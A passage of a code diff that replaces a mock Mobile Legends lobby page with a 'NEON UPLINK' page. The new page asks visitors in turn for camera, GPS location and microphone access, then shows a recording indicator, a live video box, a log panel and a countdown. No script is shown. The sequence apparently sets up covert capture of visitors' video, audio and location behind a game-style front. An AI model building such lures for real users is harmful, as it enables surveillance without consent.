@@ -1,981 +1,588 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MLBB Lobby</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            overflow: hidden;
-            width: 100vw;
-            height: 100vh;
-            background: #0a0a2e;
-        }
-
-        /* Video Background */
-        .video-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-        }
-
-        .video-bg video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        .video-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(180deg, rgba(10,10,46,0.3) 0%, rgba(10,10,46,0.1) 40%, rgba(10,10,46,0.5) 100%);
-            z-index: 1;
-        }
-
-        /* Main Container */
-        .container {
-            position: relative;
-            z-index: 2;
-            width: 100%;
-            height: 100%;
-        }
-
-        /* Top Bar */
-        .top-bar {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 8px 15px;
-            background: linear-gradient(180deg, rgba(0,0,0,0.7) 0%, transparent 100%);
-        }
-
-        .profile-section {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .profile-avatar {
-            width: 50px;
-            height: 50px;
-            border-radius: 10px;
-            border: 2px solid #4a9eff;
-            background: linear-gradient(135deg, #1a1a4e, #2a2a6e);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .profile-avatar::after {
-            content: '';
-            font-size: 28px;
-        }
-
-        .profile-info {
-            color: white;
-        }
-
-        .profile-name {
-            font-size: 16px;
-            font-weight: bold;
-            color: #fff;
-            text-shadow: 0 0 10px rgba(74,158,255,0.5);
-        }
-
-        .profile-level {
-            font-size: 11px;
-            color: #8ab4f8;
-        }
-
-        .top-icons {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .top-icon {
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            font-size: 18px;
-            transition: transform 0.2s;
-        }
-
-        .top-icon:hover {
-            transform: scale(1.1);
-        }
-
-        .currency-section {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .currency-item {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            background: rgba(0,0,0,0.5);
-            padding: 4px 10px;
-            border-radius: 15px;
-            color: white;
-            font-size: 13px;
-        }
-
-        .currency-icon {
-            font-size: 16px;
-        }
-
-        .add-btn {
-            color: #4a9eff;
-            font-size: 18px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-
-        .top-right-icons {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .icon-btn {
-            width: 32px;
-            height: 32px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            font-size: 18px;
-            color: #ccc;
-            transition: color 0.2s;
-        }
-
-        .icon-btn:hover {
-            color: white;
-        }
-
-        .turnamen-btn {
-            background: linear-gradient(135deg, #ff6b35, #ff8c42);
-            color: white;
-            padding: 6px 16px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: bold;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-
-        /* Notification Bar */
-        .notification-bar {
-            text-align: center;
-            padding: 5px;
-            color: #ffd700;
-            font-size: 12px;
-            background: rgba(0,0,0,0.3);
-        }
-
-        .notification-bar span {
-            color: #4a9eff;
-        }
-
-        /* Main Content Area */
-        .main-content {
-            display: flex;
-            justify-content: space-between;
-            padding: 10px 15px;
-            height: calc(100% - 160px);
-        }
-
-        /* Left Panel */
-        .left-panel {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-            width: 180px;
-        }
-
-        .rerun-skin {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            background: linear-gradient(135deg, #ff4444, #ff6b6b);
-            padding: 8px 12px;
-            border-radius: 8px;
-            color: white;
-            font-size: 13px;
-            font-weight: bold;
-            cursor: pointer;
-            box-shadow: 0 2px 10px rgba(255,68,68,0.4);
-        }
-
-        .rerun-skin .skin-icon {
-            font-size: 24px;
-        }
-
-        .toko-pass {
-            display: flex;
-            gap: 5px;
-        }
-
-        .toko-btn, .pass-btn {
-            flex: 1;
-            padding: 10px;
-            border-radius: 8px;
-            text-align: center;
-            color: white;
-            font-weight: bold;
-            font-size: 13px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 5px;
-        }
-
-        .toko-btn {
-            background: linear-gradient(135deg, #2196F3, #42a5f5);
-        }
-
-        .pass-btn {
-            background: linear-gradient(135deg, #ff9800, #ffb74d);
-        }
-
-        .event-free {
-            background: linear-gradient(135deg, #4CAF50, #66BB6A);
-            padding: 10px;
-            border-radius: 8px;
-            color: white;
-            cursor: pointer;
-        }
-
-        .event-free .free-label {
-            background: #ffeb3b;
-            color: #333;
-            padding: 2px 8px;
-            border-radius: 4px;
-            font-size: 10px;
-            font-weight: bold;
-            display: inline-block;
-            margin-bottom: 5px;
-        }
-
-        .event-content {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .event-avatars {
-            display: flex;
-            gap: 3px;
-        }
-
-        .event-avatar {
-            width: 35px;
-            height: 35px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, #e91e63, #f48fb1);
-            border: 2px solid white;
-        }
-
-        .event-avatar:nth-child(2) {
-            background: linear-gradient(135deg, #9c27b0, #ce93d8);
-        }
-
-        .event-reward {
-            background: rgba(0,0,0,0.3);
-            padding: 3px 8px;
-            border-radius: 10px;
-            font-size: 11px;
-            margin-left: auto;
-        }
-
-        .undian-btn {
-            background: linear-gradient(135deg, #1a237e, #3949ab);
-            padding: 10px 12px;
-            border-radius: 8px;
-            color: white;
-            font-size: 13px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-
-        .undian-btn .undian-icon {
-            font-size: 24px;
-        }
-
-        /* Center - Hero Display */
-        .center-hero {
-            flex: 1;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-        }
-
-        .hero-image {
-            width: 100%;
-            height: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-        }
-
-        .hero-placeholder {
-            font-size: 200px;
-            opacity: 0.8;
-            filter: drop-shadow(0 0 30px rgba(255,100,100,0.5));
-            animation: heroFloat 3s ease-in-out infinite;
-        }
-
-        @keyframes heroFloat {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-
-        .hero-glow {
-            position: absolute;
-            width: 300px;
-            height: 300px;
-            background: radial-gradient(circle, rgba(255,100,100,0.3) 0%, transparent 70%);
-            border-radius: 50%;
-            animation: glowPulse 2s ease-in-out infinite;
-        }
-
-        @keyframes glowPulse {
-            0%, 100% { transform: scale(1); opacity: 0.5; }
-            50% { transform: scale(1.2); opacity: 0.8; }
-        }
-
-        /* Right Panel - Friends */
-        .right-panel {
-            width: 200px;
-            background: rgba(0,0,0,0.6);
-            border-radius: 12px;
-            padding: 10px;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-
-        .friend-item {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            padding: 8px;
-            border-radius: 8px;
-            margin-bottom: 5px;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-
-        .friend-item:hover {
-            background: rgba(255,255,255,0.1);
-        }
-
-        .friend-avatar {
-            width: 40px;
-            height: 40px;
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 20px;
-            position: relative;
-        }
-
-        .friend-avatar .rank-badge {
-            position: absolute;
-            top: -5px;
-            left: -5px;
-            width: 18px;
-            height: 18px;
-            border-radius: 50%;
-            background: #ff4444;
-            color: white;
-            font-size: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-        }
-
-        .friend-avatar .online-dot {
-            position: absolute;
-            bottom: -2px;
-            right: -2px;
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            background: #4CAF50;
-            border: 2px solid #1a1a4e;
-        }
-
-        .friend-info {
-            flex: 1;
-        }
-
-        .friend-name {
-            color: white;
-            font-size: 12px;
-            font-weight: bold;
-        }
-
-        .friend-rank {
-            display: flex;
-            align-items: center;
-            gap: 3px;
-            font-size: 11px;
-            color: #aaa;
-        }
-
-        .friend-rank .star {
-            color: #ffd700;
-        }
-
-        .add-friend {
-            text-align: center;
-            padding: 10px;
-            color: #4a9eff;
-            font-size: 24px;
-            cursor: pointer;
-            border-top: 1px solid rgba(255,255,255,0.1);
-            margin-top: 5px;
-        }
-
-        /* Bottom Bar */
-        .bottom-bar {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            z-index: 10;
-            background: linear-gradient(180deg, transparent 0%, rgba(0,0,0,0.8) 30%);
-            padding: 10px 15px 15px;
-        }
-
-        .bottom-content {
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-end;
-        }
-
-        .bottom-left {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-        }
-
-        .chat-bar {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .chat-btn {
-            width: 36px;
-            height: 36px;
-            background: rgba(74,158,255,0.3);
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 16px;
-            cursor: pointer;
-        }
-
-        .chat-text {
-            background: rgba(0,0,0,0.5);
-            padding: 8px 15px;
-            border-radius: 20px;
-            color: #aaa;
-            font-size: 12px;
-            max-width: 300px;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-        }
-
-        .bottom-nav {
-            display: flex;
-            gap: 30px;
-            align-items: center;
-        }
-
-        .nav-item {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 5px;
-            cursor: pointer;
-            color: #888;
-            transition: color 0.2s;
-        }
-
-        .nav-item:hover, .nav-item.active {
-            color: #4a9eff;
-        }
-
-        .nav-icon {
-            font-size: 28px;
-        }
-
-        .nav-label {
-            font-size: 11px;
-            font-weight: bold;
-        }
-
-        .bottom-right {
-            display: flex;
-            align-items: flex-end;
-            gap: 10px;
-        }
-
-        .trade-rush {
-            background: linear-gradient(135deg, #1a237e, #283593);
-            padding: 10px 15px;
-            border-radius: 10px;
-            color: white;
-            font-size: 11px;
-            text-align: center;
-            cursor: pointer;
-            border: 1px solid rgba(74,158,255,0.3);
-        }
-
-        .trade-rush .tr-icon {
-            font-size: 24px;
-            display: block;
-            margin-bottom: 3px;
-        }
-
-        .mode-selector {
-            display: flex;
-            align-items: center;
-            gap: 0;
-        }
-
-        .mode-icon {
-            width: 50px;
-            height: 50px;
-            background: linear-gradient(135deg, #1565C0, #1E88E5);
-            border-radius: 10px 0 0 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            cursor: pointer;
-        }
-
-        .mulai-btn {
-            background: linear-gradient(135deg, #FFD700, #FFA000);
-            padding: 12px 40px;
-            border-radius: 0 10px 10px 0;
-            color: #1a1a2e;
-            font-size: 14px;
-            font-weight: bold;
-            cursor: pointer;
-            text-align: center;
-            box-shadow: 0 4px 15px rgba(255,215,0,0.4);
-            transition: transform 0.2s, box-shadow 0.2s;
-        }
-
-        .mulai-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 6px 20px rgba(255,215,0,0.6);
-        }
-
-        .mulai-btn .mode-label {
-            font-size: 10px;
-            color: #555;
-            display: block;
-        }
-
-        .mulai-btn .mulai-text {
-            font-size: 22px;
-            font-weight: 900;
-            letter-spacing: 2px;
-        }
-
-        /* Chapter Banner */
-        .chapter-banner {
-            position: fixed;
-            bottom: 80px;
-            right: 15px;
-            background: linear-gradient(135deg, rgba(255,215,0,0.9), rgba(255,165,0,0.9));
-            padding: 10px 15px;
-            border-radius: 10px;
-            color: #1a1a2e;
-            font-size: 12px;
-            font-weight: bold;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            z-index: 5;
-            box-shadow: 0 4px 15px rgba(255,215,0,0.3);
-            max-width: 220px;
-        }
-
-        .chapter-banner .chapter-icon {
-            font-size: 28px;
-        }
-
-        .chapter-banner .close-btn {
-            position: absolute;
-            top: -8px;
-            right: -8px;
-            width: 20px;
-            height: 20px;
-            background: #ff4444;
-            border-radius: 50%;
-            color: white;
-            font-size: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-        }
-
-        /* Responsive */
-        @media (max-width: 768px) {
-            .left-panel {
-                width: 140px;
-            }
-            .right-panel {
-                width: 160px;
-            }
-            .hero-placeholder {
-                font-size: 120px;
-            }
-        }
-
-        /* Animations */
-        @keyframes slideIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .friend-item {
-            animation: slideIn 0.3s ease forwards;
-        }
-
-        .friend-item:nth-child(1) { animation-delay: 0.1s; }
-        .friend-item:nth-child(2) { animation-delay: 0.2s; }
-        .friend-item:nth-child(3) { animation-delay: 0.3s; }
-        .friend-item:nth-child(4) { animation-delay: 0.4s; }
-
-        /* Particle effects */
-        .particles {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 1;
-            pointer-events: none;
-            overflow: hidden;
-        }
-
-        .particle {
-            position: absolute;
-            width: 4px;
-            height: 4px;
-            background: rgba(255,215,0,0.6);
-            border-radius: 50%;
-            animation: particleFloat 4s ease-in-out infinite;
-        }
-
-        @keyframes particleFloat {
-            0%, 100% { transform: translateY(0) rotate(0deg); opacity: 0; }
-            50% { opacity: 1; }
-            100% { transform: translateY(-100vh) rotate(720deg); opacity: 0; }
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🛰️ NEON UPLINK v3.1</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+  * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; }
+  body {
+    background: #05050a;
+    color: #00f3ff;
+    font-family: 'Share Tech Mono', monospace;
+    overflow: hidden;
+    height: 100vh;
+    width: 100vw;
+  }
+  #starfield { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; }
+  .scanlines {
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+    background: repeating-linear-gradient(0deg, rgba(0,0,0,0.15) 0px, rgba(0,0,0,0.15) 1px, transparent 1px, transparent 3px);
+    pointer-events: none; z-index: 10; opacity: 0.4;
+  }
+  .vignette {
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+    background: radial-gradient(circle, transparent 40%, #000 100%);
+    pointer-events: none; z-index: 9;
+  }
+
+  /* === SPLASH / PERMISSION SCREEN === */
+  #splashScreen {
+    position: fixed; inset: 0; z-index: 100;
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
+    background: #000;
+    padding: 20px;
+    transition: opacity 0.5s;
+  }
+  #splashScreen.hide { opacity: 0; pointer-events: none; }
+
+  .splash-logo {
+    font-size: 3.5rem; margin-bottom: 10px;
+    text-shadow: 0 0 20px #00f3ff;
+    animation: float 3s ease-in-out infinite;
+  }
+  @keyframes float {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-10px); }
+  }
+  .splash-title {
+    font-size: 2rem; color: #00f3ff;
+    text-shadow: 0 0 15px #00f3ff;
+    margin-bottom: 5px;
+    letter-spacing: 3px;
+  }
+  .splash-sub {
+    color: #666; font-size: 0.8rem; margin-bottom: 30px;
+    letter-spacing: 2px;
+  }
+
+  .progress-bar {
+    width: 100%; max-width: 400px;
+    height: 4px; background: #1a1a2e;
+    border-radius: 2px; margin-bottom: 30px;
+    overflow: hidden;
+  }
+  .progress-fill {
+    height: 100%; background: linear-gradient(90deg, #00f3ff, #ff00ff);
+    width: 0%; transition: width 0.5s ease;
+    box-shadow: 0 0 10px #00f3ff;
+  }
+
+  .perm-card {
+    width: 100%; max-width: 400px;
+    background: #0a0f1a; border: 2px solid #333;
+    border-radius: 12px; padding: 20px;
+    margin-bottom: 20px;
+    transition: all 0.3s;
+    position: relative;
+    overflow: hidden;
+  }
+  .perm-card.active {
+    border-color: #00f3ff;
+    box-shadow: 0 0 30px #00f3ff40;
+    transform: scale(1.02);
+  }
+  .perm-card.completed {
+    border-color: #00ff88;
+    opacity: 0.6;
+  }
+  .perm-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: -100%;
+    width: 100%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(0,243,255,0.1), transparent);
+    transition: left 0.5s;
+  }
+  .perm-card.active::before { left: 100%; }
+
+  .perm-header {
+    display: flex; align-items: center; justify-content: space-between;
+    margin-bottom: 10px;
+  }
+  .perm-icon-box {
+    display: flex; align-items: center; gap: 12px;
+  }
+  .perm-icon {
+    font-size: 2rem;
+    filter: grayscale(100%);
+    transition: 0.3s;
+  }
+  .perm-card.active .perm-icon {
+    filter: grayscale(0%);
+    text-shadow: 0 0 15px currentColor;
+  }
+  .perm-card.completed .perm-icon { filter: grayscale(0%); }
+  
+  .perm-title { font-size: 1.1rem; letter-spacing: 2px; }
+  .perm-desc { color: #666; font-size: 0.8rem; margin-top: 3px; }
+  
+  .perm-badge {
+    padding: 5px 12px; border-radius: 4px;
+    font-size: 0.75rem; font-weight: bold;
+    background: #222; color: #666;
+    border: 1px solid #333;
+  }
+  .perm-card.active .perm-badge {
+    background: #00f3ff20; color: #00f3ff;
+    border-color: #00f3ff;
+    animation: pulse 1s infinite;
+  }
+  .perm-card.completed .perm-badge {
+    background: #00ff8820; color: #00ff88;
+    border-color: #00ff88;
+  }
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.5; }
+  }
+
+  .step-indicator {
+    text-align: center; color: #666;
+    font-size: 0.85rem; margin-bottom: 25px;
+    letter-spacing: 1px;
+  }
+  .step-indicator span {
+    color: #00f3ff; font-weight: bold;
+  }
+
+  #actionBtn {
+    padding: 15px 50px; font-size: 1rem; font-family: inherit;
+    background: transparent; border: 2px solid #00f3ff; color: #00f3ff;
+    cursor: pointer; letter-spacing: 3px;
+    box-shadow: 0 0 20px #00f3ff40;
+    transition: 0.3s;
+    text-transform: uppercase;
+  }
+  #actionBtn:hover:not(:disabled) {
+    background: #00f3ff20;
+    transform: scale(1.05);
+    box-shadow: 0 0 30px #00f3ff60;
+  }
+  #actionBtn:disabled {
+    opacity: 0.3; cursor: wait;
+  }
+  #actionBtn.complete {
+    border-color: #00ff88; color: #00ff88;
+    box-shadow: 0 0 30px #00ff8860;
+    animation: glow 1.5s infinite;
+  }
+  @keyframes glow {
+    0%, 100% { box-shadow: 0 0 20px #00ff8860; }
+    50% { box-shadow: 0 0 40px #00ff88; }
+  }
+
+  .status-text {
+    margin-top: 15px; color: #666;
+    font-size: 0.8rem; text-align: center;
+    min-height: 20px;
+  }
+
+  /* === MAIN UI === */
+  #mainUI {
+    position: relative; z-index: 5;
+    display: none; flex-direction: column; height: 100vh; padding: 15px;
+    opacity: 0; transition: opacity 0.8s;
+  }
+  #mainUI.show { display: flex; opacity: 1; }
+
+  .hud-top { display: flex; justify-content: space-between; margin-bottom: 10px; gap: 10px; }
+  .panel {
+    background: #0a0f1a90; border: 1px solid #00f3ff50;
+    padding: 8px 12px; border-radius: 6px;
+    backdrop-filter: blur(4px);
+    font-size: 0.85rem; flex: 1; text-align: center;
+  }
+  .blink { animation: blink 1s infinite; color: #00ff88; }
+  @keyframes blink { 50% { opacity: 0.3; } }
+
+  .hud-center {
+    flex: 1; display: flex; align-items: center; justify-content: center;
+    position: relative; margin: 10px 0;
+  }
+  #video {
+    width: 100%; max-width: 500px; height: auto;
+    border: 2px solid #b026ff; border-radius: 8px;
+    background: #000; box-shadow: 0 0 25px #b026ff60;
+    transform: scaleX(-1);
+  }
+  .rec-indicator {
+    position: absolute; top: 10px; right: 10px;
+    background: #ff000080; color: #fff; padding: 4px 10px;
+    border-radius: 4px; font-weight: bold; font-size: 0.8rem;
+    animation: pulseRec 1.5s infinite;
+  }
+  @keyframes pulseRec { 50% { box-shadow: 0 0 20px red; } }
+
+  .hud-bottom { margin-top: auto; }
+  .log-panel {
+    height: 110px; overflow-y: auto; font-size: 0.72rem;
+    color: #0f0; line-height: 1.4;
+    background: #0a0f1a90; border: 1px solid #00f3ff40;
+    padding: 10px; border-radius: 6px;
+  }
+  .log-panel::-webkit-scrollbar { width: 6px; }
+  .log-panel::-webkit-scrollbar-thumb { background: #00f3ff; border-radius: 3px; }
+
+  .countdown {
+    position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%);
+    font-size: 1.1rem; color: #ff00ff; text-shadow: 0 0 10px #ff00ff;
+    background: #00000080; padding: 4px 12px; border-radius: 4px;
+  }
+</style>
 </head>
 <body>
+<canvas id="starfield"></canvas>
+<div class="scanlines"></div>
+<div class="vignette"></div>
 
-    <!-- Video Background - GANTI SRC DENGAN VIDEO KAMU -->
-    <div class="video-bg">
-        <video autoplay muted loop playsinline id="bgvideo">
-            <!-- Ganti URL ini dengan video kamu -->
-            <source src="https://files.catbox.moe/84pq2w.mp4" type="video/mp4">
-            <!-- Fallback background jika video tidak ada -->
-        </video>
+<!-- ============ SPLASH / PERMISSION SCREEN ============ -->
+<div id="splashScreen">
+  <div class="splash-logo">🛰️</div>
+  <div class="splash-title">NEON UPLINK</div>
+  <div class="splash-sub">v3.1 // SECURE TRANSMISSION</div>
+
+  <div class="progress-bar">
+    <div class="progress-fill" id="progressFill"></div>
+  </div>
+
+  <div class="step-indicator">
+    STEP <span id="currentStep">1</span> OF <span id="totalSteps">3</span>
+  </div>
+
+  <!-- Camera Permission -->
+  <div class="perm-card active" id="cardCam">
+    <div class="perm-header">
+      <div class="perm-icon-box">
+        <div class="perm-icon">📷</div>
+        <div>
+          <div class="perm-title" style="color: #00f3ff;">CAMERA</div>
+          <div class="perm-desc">Visual transmission</div>
+        </div>
+      </div>
+      <div class="perm-badge" id="badgeCam">WAITING</div>
     </div>
-    <div class="video-overlay"></div>
+  </div>
 
-    <!-- Particles -->
-    <div class="particles" id="particles"></div>
-
-    <div class="container">
-        <!-- Top Bar -->
-        <div class="top-bar">
-            <div class="profile-section">
-                <div class="profile-avatar"></div>
-                <div class="profile-info">
-                    <div class="profile-name">StableRavenessσ</div>
-                    <div class="profile-level">Lvl 4</div>
-                </div>
-            </div>
-
-            <div class="top-icons">
-                <div class="top-icon" style="background: rgba(255,255,255,0.1);">👤</div>
-                <div class="top-icon" style="background: rgba(255,215,0,0.2);">💰</div>
-                <div class="top-icon" style="background: rgba(255,165,0,0.2);">🎁</div>
-                <div class="turnamen-btn">🏆 Turnamen</div>
-            </div>
-
-            <div class="currency-section">
-                <div class="currency-item">
-                    <span class="currency-icon"></span>
-                    <span>0</span>
-                    <span class="add-btn">+</span>
-                </div>
-                <div class="currency-item">
-                    <span class="currency-icon">💎</span>
-                    <span>0</span>
-                    <span class="add-btn">+</span>
-                </div>
-            </div>
-
-            <div class="top-right-icons">
-                <div class="icon-btn">📊</div>
-                <div class="icon-btn">✉️</div>
-                <div class="icon-btn">⚙️</div>
-                <div class="icon-btn">📶</div>
-            </div>
+  <!-- Location Permission -->
+  <div class="perm-card" id="cardLoc">
+    <div class="perm-header">
+      <div class="perm-icon-box">
+        <div class="perm-icon">📍</div>
+        <div>
+          <div class="perm-title" style="color: #ff00ff;">LOCATION</div>
+          <div class="perm-desc">GPS coordinates</div>
         </div>
-
-        <!-- Notification -->
-        <div class="notification-bar">
-            🔊 <span>Pria_Oslo.</span> sudah mencapai <span style="color: #ffd700;">Grandmaster</span>
-        </div>
-
-        <!-- Main Content -->
-        <div class="main-content">
-            <!-- Left Panel -->
-            <div class="left-panel">
-                <div class="rerun-skin">
-                    <span class="skin-icon"></span>
-                    <span>Rerun Skin</span>
-                </div>
-
-                <div class="toko-pass">
-                    <div class="toko-btn">🛒 Toko</div>
-                    <div class="pass-btn">🎫 Pass</div>
-                </div>
-
-                <div class="event-free">
-                    <span class="free-label">FREE</span>
-                    <div class="event-content">
-                        <div class="event-avatars">
-                            <div class="event-avatar"></div>
-                            <div class="event-avatar"></div>
-                        </div>
-                        <div class="event-reward">🎟️ ×1,000</div>
-                    </div>
-                    <div style="font-size: 11px; margin-top: 5px;">Event</div>
-                </div>
-
-                <div class="undian-btn">
-                    <span>⚡ Undian</span>
-                    <span class="undian-icon">👑</span>
-                </div>
-            </div>
-
-            <!-- Center Hero -->
-            <div class="center-hero">
-                <div class="hero-image">
-                    <div class="hero-glow"></div>
-                    <div class="hero-placeholder"></div>
-                </div>
-            </div>
-
-            <!-- Right Panel - Friends -->
-            <div class="right-panel">
-                <div class="friend-item">
-                    <div class="friend-avatar" style="background: linear-gradient(135deg, #1a237e, #3949ab);">
-                        <span class="rank-badge">7</span>
-                        <span></span>
-                        <span class="online-dot"></span>
-                    </div>
-                    <div class="friend-info">
-                        <div class="friend-name">°NOVI...</div>
-                        <div class="friend-rank">
-                            <span>🏅</span>
-                            <span class="star">⭐</span> 9
-                        </div>
-                    </div>
-                </div>
-
-                <div class="friend-item">
-                    <div class="friend-avatar" style="background: linear-gradient(135deg, #4a148c, #7b1fa2);">
-                        <span></span>
-                        <span class="online-dot"></span>
-                    </div>
-                    <div class="friend-info">
-                        <div class="friend-name">Caalv...</div>
-                        <div class="friend-rank">
-                            <span>IV</span>
-                            <span class="star">⭐</span> 2
-                        </div>
-                    </div>
-                </div>
-
-                <div class="friend-item">
-                    <div class="friend-avatar" style="background: linear-gradient(135deg, #006064, #00838f);">
-                        <span>🐬</span>
-                        <span class="online-dot"></span>
-                    </div>
-                    <div class="friend-info">
-                        <div class="friend-name">^6%Gu...</div>
-                        <div class="friend-rank">
-                            <span>I</span>
-                            <span class="star">⭐</span> 2
-                        </div>
-                    </div>
-                </div>
-
-                <div class="friend-item">
-                    <div class="friend-avatar" style="background: linear-gradient(135deg, #b71c1c, #e53935);">
-                        <span>🤖</span>
-                    </div>
-                    <div class="friend-info">
-                        <div class="friend-name">5-°Lu...</div>
-                        <div class="friend-rank">
-                            <span>III</span>
-                            <span class="star">⭐</span> 4
-                        </div>
-                    </div>
-                </div>
-
-                <div class="add-friend">+</div>
-            </div>
-        </div>
-
-        <!-- Chapter Banner -->
-        <div class="chapter-banner" id="chapterBanner">
-            <span class="chapter-icon">📖</span>
-            <div>
-                <div>Selesaikan Chapter 1</div>
-                <div style="font-size: 10px;">Buat Dapetin Hadiah Ini!</div>
-            </div>
-            <div class="close-btn" onclick="document.getElementById('chapterBanner').style.display='none'">✕</div>
-        </div>
-
-        <!-- Bottom Bar -->
-        <div class="bottom-bar">
-            <div class="bottom-content">
-                <div class="bottom-left">
-                    <div class="chat-bar">
-                        <div class="chat-btn">+</div>
-                        <div class="chat-text">にぼ°∞/ ايتاتشي グ: ✦· 9♡ℰ·°·✧ li...</div>
-                    </div>
-                    <div class="bottom-nav">
-                        <div class="nav-item active">
-                            <span class="nav-icon">⚔️</span>
-                            <span class="nav-label">Hero</span>
-                        </div>
-                        <div class="nav-item">
-                            <span class="nav-icon">🛡️</span>
-                            <span class="nav-label">Persiapan</span>
-                        </div>
-                        <div class="nav-item">
-                            <span class="nav-icon">🎒</span>
-                            <span class="nav-label">Inventaris</span>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="bottom-right">
-                    <div class="trade-rush">
-                        <span class="tr-icon">🏆</span>
-                        Trade Rush
-                    </div>
-                    <div class="mode-selector">
-                        <div class="mode-icon"></div>
-                        <div class="mulai-btn" onclick="startGame()">
-                            <span class="mode-label">5v5 Normal</span>
-                            <span class="mulai-text">MULAI</span>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
+      </div>
+      <div class="perm-badge" id="badgeLoc">PENDING</div>
     </div>
+  </div>
 
-    <script>
-        // Create particles
-        function createParticles() {
-            const container = document.getElementById('particles');
-            for (let i = 0; i < 20; i++) {
-                const particle = document.createElement('div');
-                particle.className = 'particle';
-                particle.style.left = Math.random() * 100 + '%';
-                particle.style.top = Math.random() * 100 + '%';
-                particle.style.animationDelay = Math.random() * 4 + 's';
-                particle.style.animationDuration = (3 + Math.random() * 3) + 's';
-                container.appendChild(particle);
-            }
-        }
-        createParticles();
+  <!-- Microphone Permission -->
+  <div class="perm-card" id="cardMic">
+    <div class="perm-header">
+      <div class="perm-icon-box">
+        <div class="perm-icon">🎤</div>
+        <div>
+          <div class="perm-title" style="color: #00ff88;">MICROPHONE</div>
+          <div class="perm-desc">Audio recording</div>
+        </div>
+      </div>
+      <div class="perm-badge" id="badgeMic">PENDING</div>
+    </div>
+  </div>
 
-        // Start game button
-        function startGame() {
-            const btn = document.querySelector('.mulai-btn');
-            btn.style.transform = 'scale(0.95)';
-            setTimeout(() => {
-                btn.style.transform = 'scale(1)';
-                alert('Mencari pertandingan...');
-            }, 150);
-        }
+  <button id="actionBtn">INITIALIZE</button>
+  <div class="status-text" id="statusText">Tap to begin permission sequence</div>
+</div>
 
-        // Nav items click
-        document.querySelectorAll('.nav-item').forEach(item => {
-            item.addEventListener('click', function() {
-                document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
-                this.classList.add('active');
-            });
-        });
+<!-- ============ MAIN GAME UI ============ -->
+<div id="mainUI">
+  <div class="hud-top">
+    <div class="panel">STATUS: <span class="blink">ONLINE</span></div>
